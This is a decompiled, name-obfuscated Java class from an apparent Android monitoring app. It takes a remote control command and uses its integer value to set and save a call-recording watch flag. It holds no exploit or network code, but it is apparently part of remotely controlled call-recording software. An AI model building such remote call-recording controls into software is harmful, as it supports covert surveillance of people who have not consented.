package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefCallRecordingWatchFlag;
import com.vvt.preference.b;
import com.vvt.remotecontrol.ControlCommand;

public class bm
{
  private static final boolean a = a.a;
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    b localb = paramh.n;
    Object localObject1 = FxPreferenceType.CALL_RECORDING_WATCH_FLAG;
    localObject1 = (PrefCallRecordingWatchFlag)localb.a((FxPreferenceType)localObject1);
    Object localObject2 = paramControlCommand.getData();
    boolean bool2 = localObject2 instanceof Integer;
    if (bool2)
    {
      bool2 = a;
      if (bool2) {}
      localObject2 = (Integer)localObject2;
      int i = ((Integer)localObject2).intValue();
      ((PrefCallRecordingWatchFlag)localObject1).setCallRecWatchFlag(i);
      localb.b();
      bool1 = a;
      if (!bool1) {}
    }
    bool1 = a;
    if (bool1) {}
    return true;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bm.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */